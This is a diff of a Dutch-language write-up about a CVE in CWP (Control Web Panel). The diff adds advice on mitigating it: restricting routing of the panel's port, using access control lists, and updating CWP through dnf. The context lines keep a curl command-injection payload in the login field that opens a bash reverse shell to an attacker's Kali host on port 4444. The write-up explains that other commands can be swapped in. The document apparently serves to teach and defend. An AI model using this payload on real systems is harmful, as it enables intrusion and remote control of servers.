@@ -100,3 +100,9 @@ curl -d "login=admin\" ; bash -i >& /dev/tcp/$IP_KALI$/4444 0>&1 ; #" http://$IP
 
 >Het commando `bash -i >& /dev/tcp/$IP_KALI$/4444 0>&1` wordt door onverwachte breaks `;` door de shell uitgevoerd om een reverse shell mogelijk te maken. 
 >Dit kan eventueel vervangen worden om andere commando's uit te voeren op de kwetsbare machine.
+
+# Hoe sluit je de CVE uit?
+
+De CVE kan worden weggewerkt door de poort van *cwp* niet te laten routeren. Hierdoor heeft enkel het bedrijfsnetwerk toegang tot het dashboard (en de exploit). Zorg ervoor dat je goede *Access Control Lists* hebt, zodat enkel de bevoegde gebruikers toegang hebben. 
+
+Uiteraard kan de exploit het makkelijkste verholpen worden door *CWP* te updaten via dnf. 
